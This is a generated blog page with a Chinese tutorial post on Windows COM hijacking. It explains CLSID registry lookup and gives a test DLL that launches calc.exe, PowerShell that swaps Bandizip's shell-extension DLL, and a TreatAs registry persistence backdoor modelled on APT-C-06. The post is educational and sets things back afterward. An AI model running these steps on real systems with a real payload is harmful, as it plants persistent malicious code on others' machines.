@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="本文简要介绍了COM组件的劫持原理，展示了几种常见的劫持方法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="COM组件劫持学习：从初识到简单利用">
+<meta property="og:url" content="http://yoursite.com/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Bu1&#39;Blog">
+<meta property="og:description" content="本文简要介绍了COM组件的劫持原理，展示了几种常见的劫持方法。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211118160207211-16380001077251.png">
+<meta property="og:image" content="http://yoursite.com/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211118144419202-16380001077252.png">
+<meta property="og:image" content="http://yoursite.com/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211118211437026-16380001077263.png">
+<meta property="og:image" content="http://yoursite.com/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211119114327714-16380001077264.png">
+<meta property="og:image" content="http://yoursite.com/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211119114445808-16380001077265.png">
+<meta property="og:image" content="http://yoursite.com/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211119134858899-16380001077266.png">
+<meta property="article:published_time" content="2021-11-27T08:00:47.000Z">
+<meta property="article:modified_time" content="2021-11-27T08:04:08.347Z">
+<meta property="article:author" content="Bu1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211118160207211-16380001077251.png">
+
+<link rel="canonical" href="http://yoursite.com/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>COM组件劫持学习：从初识到简单利用 | Bu1'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Bu1'Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">如果能控制粗鄙的狂喜，就不会有深入骨髓的悲伤。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Bu1">
+      <meta itemprop="description" content="最为惊艳的是思想碰撞产生的火花。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bu1'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          COM组件劫持学习：从初识到简单利用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-27 16:00:47 / 修改时间：16:04:08" itemprop="dateCreated datePublished" datetime="2021-11-27T16:00:47+08:00">2021-11-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Windows安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文简要介绍了COM组件的劫持原理，展示了几种常见的劫持方法。</p>
+<span id="more"></span>
+
+<h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="COM组件"><a href="#COM组件" class="headerlink" title="COM组件"></a>COM组件</h3><p>什么是COM组件？它又有什么用呢？根据百度百科的说法，COM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。</p>
+<p>一句话总结：COM组件在需要的时候可以被调用，并提供相应功能。更为详细的学习可以看<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/com/component-object-model--com--portal">官方文档</a>。</p>
+<h3 id="CLSID"><a href="#CLSID" class="headerlink" title="CLSID"></a>CLSID</h3><p>CLSID是微软提出的一个概念，中文翻译为：全局唯一标识符。CLSID是指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系统组件分配的一个唯一表示它的ID代码，用于对其身份的标识和与其他对象进行区分。上文提到COM组件在需要的时候会被调用，就是通过CLSID来识别调用的。关于CLSID更为详细的介绍可以看<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/com/clsid-key-hklm">官方文档</a>。</p>
+<p>常见的CLSID：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125; 我的电脑</span><br><span class="line">&#123;450D8FBA-AD25-11D0-98A8-0800361B1103&#125; 我的文档</span><br><span class="line">&#123;645FF040-5081-101B-9F08-00AA002F954E&#125; 回收站</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>WIN+R</code>调用，输入**::{450D8FBA-AD25-11D0-98A8-0800361B1103}**，回车确认后打开我的文档。</p>
+<p><img src="/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211118160207211-16380001077251.png" alt="image-20211118160207211"></p>
+<h3 id="COM组件劫持原理"><a href="#COM组件劫持原理" class="headerlink" title="COM组件劫持原理"></a>COM组件劫持原理</h3><p>一般来说，COM组件在被调用加载过程中会寻找注册表三个位置：</p>
+<ol>
+<li>HKCU\Software\Classes\CLSID\{CLSID}</li>
+<li>HKCR\CLSID\{CLSID}</li>
+<li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\{CLSID}</li>
+</ol>
+<p>每一个CLSID键下会有一个基本子键<code>LocalServer32</code>或<code>InprocServer32</code>，它两的键值代表该COM组件提供的功能。其中<code>LocalServer32</code>的默认键值一般表示可执行文件(exe)的路径，而<code>InprocServer32</code>的默认键值表示动态链接库(DLL)的路径。也可以有其他的子键，如图中所示的<code>ThreadingModel</code>作用是标记该DLL的线程模型，更为详细的介绍可以看微软<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/com/inprocserver32">官方文档</a>。</p>
+<p><img src="/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211118144419202-16380001077252.png" alt="image-20211118144419202"></p>
+<p>所以，根据COM调用加载过程很直观的可以看出理论上可行的3种劫持方案：</p>
+<ul>
+<li>HKCR中有，而HKCU中没有，只需要在HKCU中注册即可劫持HKCR中的COM服务。</li>
+<li>修改掉<code>LocalServer32</code>或<code>InprocServer32</code>的键值。</li>
+<li>替换掉<code>LocalServer32</code>或<code>InprocServer32</code>的键值中的文件。</li>
+</ul>
+<p>关于COM组件劫持技术更为准确的定义可以看Mitre ATT&amp;CK框架中的<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1546/015/">COM劫持</a>部分。</p>
+<h2 id="0x02-COM劫持实操"><a href="#0x02-COM劫持实操" class="headerlink" title="0x02 COM劫持实操"></a>0x02 COM劫持实操</h2><p>首先用VS生成一个测试用的<code>calculator_x64.dll</code>，这里的dll功能是弹出计算器。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">payload</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="多种调用方式"><a href="#多种调用方式" class="headerlink" title="多种调用方式"></a>多种调用方式</h3><p>上文提到过通过<code>WIN+R</code>可以调用一些Windows内置的CLSID，除此之外还可以通过多种方式调用CLSID。(<strong>注：这里指的调用都是为了测试劫持效果，非COM的使用方式。</strong>)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe -sta &#123;CLSID&#125;</span><br><span class="line">verclsid.exe /S /C &#123;CLSID&#125;</span><br><span class="line">xwizard.exe RunWizard /taero /u &#123;CLSID&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="覆盖劫持"><a href="#覆盖劫持" class="headerlink" title="覆盖劫持"></a>覆盖劫持</h3><p>以上图的Bandzip中的一个COM服务为例，通过将原本的bdzshl.x64.dll文件替换掉来达到劫持效果。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#备份原有的bdzshl.x64.dll文件，移入制作好的calculator_x64.dll为bdzshl.x64.dll</span></span><br><span class="line"><span class="built_in">Set-location</span> <span class="literal">-Path</span> <span class="string">&quot;C:\Program Files\Bandizip&quot;</span></span><br><span class="line"><span class="built_in">Move-Item</span> bdzshl.x64.dll bdzshl.x64.dll.bak</span><br><span class="line"><span class="built_in">Copy-Item</span> C:\tmp\calculator_x64.dll bdzshl.x64.dll</span><br><span class="line"><span class="comment">#调用&#123;CLSID&#125;测试</span></span><br><span class="line">cmd /c <span class="string">&#x27;rundll32.exe -sta &#123;5B69A6B4-393B-459C-8EBB-214237A9E7AC&#125;&#x27;</span></span><br><span class="line"><span class="comment">#还原环境</span></span><br><span class="line"><span class="built_in">Move-Item</span> bdzshl.x64.dll.bak bdzshl.x64.dll <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211118211437026-16380001077263.png" alt="image-20211118211437026"></p>
+<p>上述提到的其余两种方法类似操作，这里就不再赘述，下面再介绍一种别的方法。</p>
+<h2 id="0x03-通过TreatAS键劫持实现持久化后门"><a href="#0x03-通过TreatAS键劫持实现持久化后门" class="headerlink" title="0x03 通过TreatAS键劫持实现持久化后门"></a>0x03 通过TreatAS键劫持实现持久化后门</h2><p>在{CLSID}下还可以存在着一个TreatAS子键，使用TreatAS子键可以链接到别的{CLSID}中。更为详尽的介绍可以看<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/com/treatas">官方文档</a>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COM调用 =&gt; &#123;CLSID&#125; =&gt; TreatAs键 =&gt; 读取TreatAs默认值  =&gt; 跳转指定的&#123;CLSID&#125;</span><br></pre></td></tr></table></figure>
+
+<p>APT-C-06组织曾利用过这种COM劫持方法来做持久化后门。</p>
+<blockquote>
+<p><strong>COM劫持</strong></p>
+<p>攻击者在注册表 HKLM\software\classes\CLSID\ 下添加一个不存在的CLSID节点结构，例如{C5602CE6-9B79-11D3-B654-581BBAEF8DBA}，并将键值设置成恶意文件的路径，然后再在家庭网络配置管理器的CLSID节点{46C166AA-3108-11D4-9348-00C04F8EEB71}下新建TreatAs项，并将键值设置成{C5602CE6-9B79-11D3-B654-581BBAEF8DBA}，再重启服务，这样当系统引用家庭网络配置管理器的CLSID时就会链接到新的CLSID上，从而加载恶意文件，达到COM劫持的目的。</p>
+<p>引用自:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/nyxZFXgrtm2-tBiV3-wiMg">Darkhotel（APT-C-06）组织利用Thinmon后门框架的多起攻击活动揭秘</a></p>
+</blockquote>
+<p>按照上文给的说明来使用Powershell复现一下通过TreatAs键做COM劫持(<strong>注：</strong>需要足够的权限)</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义</span></span><br><span class="line"><span class="variable">$HKLM</span> = <span class="string">&quot;HKLM:\software\classes\CLSID&quot;</span></span><br><span class="line"><span class="variable">$CLSID</span> = <span class="string">&quot;&#123;C5602CE6-9B79-11D3-B654-581BBAEF8DBA&#125;&quot;</span></span><br><span class="line"><span class="variable">$HijackCLSID</span> = <span class="string">&quot;&#123;46C166AA-3108-11D4-9348-00C04F8EEB71&#125;&quot;</span></span><br><span class="line"><span class="variable">$DLL</span> = <span class="string">&quot;C:\tmp\calculator_x64.dll&quot;</span></span><br><span class="line"><span class="comment">#新建恶意CLSID节点&#123;C5602CE6-9B79-11D3-B654-581BBAEF8DBA&#125;</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Type</span> Directory <span class="string">&quot;<span class="variable">$HKLM</span>\<span class="variable">$CLSID</span>&quot;</span></span><br><span class="line"><span class="comment">#将键值指向恶意文件的路径并设置DLL线程模型</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-ItemType</span> String <span class="string">&quot;<span class="variable">$HKLM</span>\<span class="variable">$CLSID</span>\InprocServer32&quot;</span> <span class="literal">-value</span> <span class="variable">$DLL</span></span><br><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;<span class="variable">$HKLM</span>\<span class="variable">$CLSID</span>\InprocServer32&quot;</span> <span class="literal">-Name</span> <span class="string">&quot;ThreadingModel&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;Both&quot;</span></span><br><span class="line"><span class="comment">#在家庭网络配置管理器下CLSID节点新建TreatAs键并将默认值指向恶意CLSID节点</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-ItemType</span> String <span class="string">&quot;<span class="variable">$HKLM</span>\<span class="variable">$HijackCLSID</span>\TreatAs&quot;</span> <span class="literal">-value</span> <span class="variable">$CLSID</span></span><br><span class="line"><span class="comment">#调用测试</span></span><br><span class="line">rundll32.exe <span class="literal">-sta</span> <span class="variable">$HijackCLSID</span></span><br><span class="line"><span class="comment">#环境恢复，删除TreatAs键和恶意CLSID节点</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="literal">-Path</span> <span class="string">&quot;<span class="variable">$HKLM</span>\<span class="variable">$CLSID</span>&quot;</span> <span class="literal">-recurse</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="literal">-Path</span> <span class="string">&quot;<span class="variable">$HKLM</span>\<span class="variable">$HijackCLSID</span>\TreatAs&quot;</span> <span class="literal">-recurse</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211119114327714-16380001077264.png" alt="image-20211119114327714"></p>
+<p>注册表中原有的家庭网络配置管理器的CLSID节点多了一个TreatAs键指向{C5602CE6-9B79-11D3-B654-581BBAEF8DBA}</p>
+<p><img src="/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211119114445808-16380001077265.png" alt="image-20211119114445808"></p>
+<p>{C5602CE6-9B79-11D3-B654-581BBAEF8DBA}中的内容为</p>
+<p><img src="/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20211119134858899-16380001077266.png" alt="image-20211119134858899"></p>
+<h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>由于个人水平有限，可能有些地方没有表述清楚抑或表述错误，所以能给出官方文档的地方都给出了链接。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/10/30/Windows%E5%9F%BA%E7%A1%80(%E4%B8%89)%EF%BC%9A%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%8E%E8%87%AA%E5%90%AF%E5%8A%A8/" rel="prev" title="Windows基础(三)：注册表与自启动">
+      <i class="fa fa-chevron-left"></i> Windows基础(三)：注册表与自启动
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">0x01 基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#COM%E7%BB%84%E4%BB%B6"><span class="nav-number">1.1.</span> <span class="nav-text">COM组件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CLSID"><span class="nav-number">1.2.</span> <span class="nav-text">CLSID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.</span> <span class="nav-text">COM组件劫持原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-COM%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%93%8D"><span class="nav-number">2.</span> <span class="nav-text">0x02 COM劫持实操</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E7%A7%8D%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">2.1.</span> <span class="nav-text">多种调用方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E5%8A%AB%E6%8C%81"><span class="nav-number">2.2.</span> <span class="nav-text">覆盖劫持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E9%80%9A%E8%BF%87TreatAS%E9%94%AE%E5%8A%AB%E6%8C%81%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96%E5%90%8E%E9%97%A8"><span class="nav-number">3.</span> <span class="nav-text">0x03 通过TreatAS键劫持实现持久化后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%90%8E%E8%AE%B0"><span class="nav-number">4.</span> <span class="nav-text">0x04 后记</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Bu1</p>
+  <div class="site-description" itemprop="description">最为惊艳的是思想碰撞产生的火花。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">8</span>
